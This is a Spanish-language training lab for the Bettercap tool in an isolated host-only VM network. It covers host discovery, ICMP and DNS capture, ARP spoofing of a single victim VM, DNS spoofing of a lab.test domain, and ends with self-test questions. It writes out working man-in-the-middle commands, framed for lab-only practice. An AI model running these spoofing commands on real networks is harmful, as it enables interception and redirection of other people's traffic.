# 07 — Laboratorio completo de Bettercap

## Objetivo

Construir un laboratorio aislado donde puedas practicar descubrimiento, captura y conceptos MITM sin tocar una red de terceros.

## Topología recomendada

```text
              Red Host-Only 192.168.56.0/24

        ┌───────────────────────────────┐
        │                               │
  Kali / Bettercap                Windows/Linux víctima
  192.168.56.103                  192.168.56.102
        │                               │
        └───────── 192.168.56.1 ────────┘
                    Gateway/Lab
```

También puedes añadir una tercera VM que haga de servidor web/DNS de pruebas.

## Fase 1 — Verificar red

### Kali

```bash
ip addr
ip route
ip neigh
```

### Windows víctima

```powershell
ipconfig
arp -a
```

Antes de Bettercap debes poder explicar qué IP tiene cada máquina y cuál es el gateway.

## Fase 2 — Arrancar Bettercap

```bash
sudo bettercap
```

Dentro:

```text
help
```

Consulta ayuda de módulos:

```text
help net.recon
help net.probe
help net.sniff
```

## Fase 3 — Descubrimiento

```text
net.recon on
net.probe on
```

Espera unos segundos y ejecuta:

```text
net.show
```

Objetivo:

- localizar la víctima;
- localizar el gateway;
- identificar tu propio equipo;
- comparar IP/MAC con `arp -a` o `ip neigh`.

## Fase 4 — Captura ICMP

Configura:

```text
set net.sniff.local true
set net.sniff.filter "icmp"
set net.sniff.output ./icmp-lab.pcap
net.sniff on
```

Desde una VM ejecuta `ping` hacia otra.

Después:

```text
net.sniff off
```

Abre `icmp-lab.pcap` con Wireshark.

Debes identificar:

```text
Ethernet
IPv4
ICMP Echo Request
ICMP Echo Reply
```

## Fase 5 — Captura DNS

```text
set net.sniff.filter "udp port 53"
set net.sniff.output ./dns-lab.pcap
net.sniff on
```

Genera consultas DNS desde una máquina propia.

Después:

```text
net.sniff off
```

Analiza:

- query;
- transaction ID;
- nombre consultado;
- respuesta;
- IP devuelta.

## Fase 6 — Comprender ARP antes del MITM

En la víctima:

```powershell
arp -a
```

En Kali:

```bash
ip neigh
```

Apunta la MAC asociada al gateway.

No continúes hasta poder explicar esta frase:

> “Para llegar al gateway dentro de la LAN, mi equipo necesita conocer qué MAC corresponde a la IP del gateway.”

## Fase 7 — ARP spoofing estrictamente en el laboratorio

Limita el objetivo a tu VM víctima:

```text
set arp.spoof.targets 192.168.56.102
arp.spoof on
```

Comprueba de nuevo la tabla ARP en la víctima.

Observa:

- qué asociación cambia;
- qué MAC aparece;
- si sigue habiendo conectividad;
- qué tráfico llega ahora a Bettercap.

Después detén:

```text
arp.spoof off
```

Vuelve a comprobar la tabla ARP.

## Fase 8 — DNS ficticio controlado

Utiliza exclusivamente un dominio reservado para tu práctica, por ejemplo:

```text
lab.test
```

Configura una tercera VM con una página web local y su IP, por ejemplo:

```text
192.168.56.200
```

En Bettercap:

```text
set dns.spoof.domains lab.test
set dns.spoof.address 192.168.56.200
dns.spoof on
```

Genera la consulta desde la víctima y observa la respuesta.

Termina siempre con:

```text
dns.spoof off
arp.spoof off
net.sniff off
net.probe off
net.recon off
```

## Fase 9 — Automatizar reconocimiento

Crea `recon-lab.cap`:

```text
net.recon on
net.probe on
set net.show.sort seen desc
```

Ejecuta:

```bash
sudo bettercap -caplet recon-lab.cap
```

## Fase 10 — Preguntas de examen personal

Si puedes contestar estas sin mirar apuntes, tienes una buena base:

1. ¿Qué diferencia hay entre `net.recon` y `net.probe`?
2. ¿Por qué no ves automáticamente todo el tráfico de un switch?
3. ¿Qué es una tabla ARP?
4. ¿Qué cambia durante ARP spoofing?
5. ¿Qué papel tiene el forwarding?
6. ¿Por qué HTTPS limita lo que un MITM puede leer/modificar?
7. ¿Qué hace `net.sniff.local`?
8. ¿Qué es un filtro BPF?
9. ¿Qué es un caplet?
10. ¿Qué diferencia hay entre CLI, Web UI y API REST?

## Resultado final esperado

Debes ser capaz de pasar de esto:

```text
“sé escribir arp.spoof on”
```

a esto:

```text
“sé qué capa estoy manipulando, qué tabla cambia, por qué cambia,
qué tráfico espero observar y cómo revertir la práctica.”
```
